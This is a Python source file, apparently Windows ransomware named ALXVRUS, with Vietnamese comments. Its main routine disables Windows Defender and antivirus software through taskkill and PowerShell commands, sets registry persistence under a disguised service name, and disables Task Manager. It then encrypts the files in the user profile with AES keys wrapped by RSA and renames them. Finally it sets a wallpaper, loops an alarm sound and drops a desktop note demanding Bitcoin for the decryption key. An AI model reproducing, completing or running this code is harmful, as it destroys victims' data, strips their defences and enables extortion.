import os
import subprocess
import sys
import threading
import queue
import time
import winreg
import ctypes
import winsound
import psutil
import shutil
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
MUSIC_FILE = "alarm.wav"
def play_alarm(): # Xóa self
    path_to_sound = resource_path("alarm.wav")
    if os.path.exists(path_to_sound):
        try:
            # SND_LOOP + SND_ASYNC để tự động lặp ngầm không cần vòng lặp while
            winsound.PlaySound(path_to_sound, winsound.SND_FILENAME | winsound.SND_LOOP | winsound.SND_ASYNC)
        except: pass
    else:
        winsound.PlaySound("SystemAsterisk", winsound.SND_ALIAS | winsound.SND_LOOP | winsound.SND_ASYNC)

# --- Chỉnh sửa 2: Cải thiện hàm prepare_wallpaper để tránh lỗi chiếm dụng file ---
def prepare_wallpaper():
    original_img = resource_path("alx.jpg")
    temp_img = os.path.join(os.environ.get("TEMP", "."), "alx_bg.jpg")
    if os.path.exists(original_img):
        try: 
            if not os.path.exists(temp_img): # Chỉ copy nếu chưa có để tránh lỗi Access Denied
                shutil.copy2(original_img, temp_img)
            return temp_img
        except: return original_img
    return None

def resource_path(relative_path):
    try:
        base_path = getattr(sys, '_MEIPASS', os.path.abspath("."))
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

rsa_mtx = threading.Lock()

def disable_antivirus():
    antivirus_software = ['McAfee', 'Norton', 'Kaspersky']
    for software in antivirus_software:
        path_to_file = rf"C:\Program Files\{software}.exe"
        if os.path.exists(path_to_file):
            try: os.remove(path_to_file)
            except: pass

    if sys.platform == 'win32':
        try: subprocess.run(['taskkill.exe', '/f', '/im', 'MsMpEng.exe'], shell=True, capture_output=True)
        except: pass

def bypass_defender():
    try:
        current_dir = os.path.dirname(os.path.realpath(sys.argv[0]))
        subprocess.run(f'powershell.exe -Command "Add-MpPreference -ExclusionPath \'{current_dir}\'"', shell=True, capture_output=True)
        subprocess.run('powershell.exe -Command "Set-MpPreference -DisableRealtimeMonitoring $true"', shell=True, capture_output=True)
    except: pass

def add_to_startup():
    try:
        exe_path = os.path.realpath(sys.argv[0])
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "SystemRuntimeService", 0, winreg.REG_SZ, f'"{exe_path}"')
        winreg.CloseKey(key)
    except: pass

def thiet_lap_hinh_nen_fit(path_anh):
    path_anh = os.path.abspath(path_anh)
    if not os.path.exists(path_anh):
        return
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Control Panel\Desktop", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WallpaperStyle", 0, winreg.REG_SZ, "2") 
        winreg.SetValueEx(key, "TileWallpaper", 0, winreg.REG_SZ, "0")
        winreg.CloseKey(key)
        ctypes.windll.user32.SystemParametersInfoW(20, 0, path_anh, 3)
    except: pass

def vo_hieu_hoa_taskmgr(status=1):
    try:
        registry_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, registry_path)
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, status)
        winreg.CloseKey(key)
    except: pass

class BoundedQueue:
    def __init__(self, size):
        self.q = queue.Queue(maxsize=size)
        self.done = False
    def push(self, item):
        if not self.done: self.q.put(item)
    def pop(self):
        try: return self.q.get(timeout=1)
        except queue.Empty: return None

def EncryptFile(path, rsa_pub):
    try:
        with open(path, 'rb') as f: buffer = f.read()
        aes_key, nonce = os.urandom(32), os.urandom(12)
        with rsa_mtx:
            ek = rsa_pub.encrypt(aes_key, padding.OAEP(mgf=padding.MGF1(hashes.SHA256()), algorithm=hashes.SHA256(), label=None))
        cipher = Cipher(algorithms.AES(aes_key), modes.GCM(nonce), backend=default_backend())
        encryptor = cipher.encryptor()
        ctx = encryptor.update(buffer) + encryptor.finalize()
        with open(path, 'wb') as f:
            f.write(ek + nonce + encryptor.tag + ctx)
        os.rename(path, path + ".alxvrus")
    except: pass

def SecureScanner(target, q_obj):
    thu_muc_cam = {"windows", "program files", "program files (x86)", "appdata", "boot", "system volume information", "recovery", "$recycle.bin"}
    bo_qua_ext = {".exe", ".dll", ".sys", ".pem", ".lnk", ".ini"}

    try:
        with open("targets_found.txt", "w", encoding="utf-8") as output_file:
            for root, dirs, files in os.walk(target, topdown=True):
                dirs[:] = [d for d in dirs if d.lower() not in thu_muc_cam]
                for file in files:
                    ext = os.path.splitext(file)[1].lower()
                    if ext in bo_qua_ext:
                        continue
                    full_path = os.path.join(root, file)
                    try:
                        output_file.write(full_path + "\n")
                        q_obj.push(full_path)
                    except: pass
    except: pass
    q_obj.done = True

def worker(q, rsa_pub):
    while not q.done or not q.q.empty():
        file_path = q.pop()
        if file_path:
            EncryptFile(file_path, rsa_pub)

# --- 3. Main ---

pub_pem = b"""-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuTSFZcQrlH6+J/Bvic6k
1mGmoBQFXkteag987WQhb3bBdkrJPhy+GR+E0ruBYw387ePVA4w0ymP6MwsKZDV+
17pk77sOZjtCVGqEQZcg1ZV5eRrJ3erY/IHQqhRu+wv21dto3RhRkKucoG2A6kJh
r6F9hA10ahXk1WMq5Nc5q7iahi2iQUOU+vd3B3qZMPZlASfOt/4S0lL0EkExqVRf
ZuEaTYPEMO7zzH9OThztES4ZyaWceh2LW4Aif6eoc8thCHC8arGl1uf9Qmvp/UET
02zxKco0u+DmkaMHB2hy4xu70T/V1hq/bQaPuFevk5J98rSvPWj8QTCw3SipaAqw
/QIDAQAB
-----END PUBLIC KEY-----"""

def create_readme():
    try:
        desktop = os.path.join(os.environ['USERPROFILE'], 'Desktop')
        readme_path = os.path.join(desktop, "README_TO_RECOVER_FILES.txt")
        content = """[!!!] ALL YOUR FILES ARE ENCRYPTED [!!!]

Your system has been locked by ALXVRUS.
All important documents, photos, and data have been encrypted using the RSA-2048 algorithm.

HOW TO RECOVER YOUR FILES?
1. You need a Private Key file (.pem).
2. Open the ALXVRUS DECRYPTOR that appears on the screen.
3. Purchase a key from the hacker or contact them to obtain the .pem file (this will usually be expensive).
4. Bitcoin is an accepted payment method; be prepared. Bitcoin: 1A2b3C4d5E6f7G8h9I0jK1L2m3N4o5P6q7R8s9T0uVwXyZ
5. Load the .pem file and press [EXECUTE DECRYPTION].
Do not attempt to modify the file or use third-party software,
otherwise your data will be permanently corrupted!
-----------------------------------------------------------
[ALXVRUS SYSTEM RECOVERY - 2026]
""" 
        with open(readme_path, "w", encoding="utf-8") as f:
            f.write(content)
    except: pass

def main():
    rsa_pub = serialization.load_pem_public_key(pub_pem, backend=default_backend())
    q = BoundedQueue(5000)
    
    create_readme()
    disable_antivirus()
    bypass_defender()
    
    final_wallpaper_path = prepare_wallpaper()
    if final_wallpaper_path:
        thiet_lap_hinh_nen_fit(final_wallpaper_path)
        
    add_to_startup()
    vo_hieu_hoa_taskmgr(1)

    threads = []
    for _ in range(4):
        t = threading.Thread(target=worker, args=(q, rsa_pub), daemon=True)
        t.start()
        threads.append(t)

    user_p = os.environ.get("USERPROFILE", os.path.expanduser("~"))
    if user_p:
        SecureScanner(user_p, q)

    for t in threads:
        t.join()

if __name__ == "__main__":
    main()
    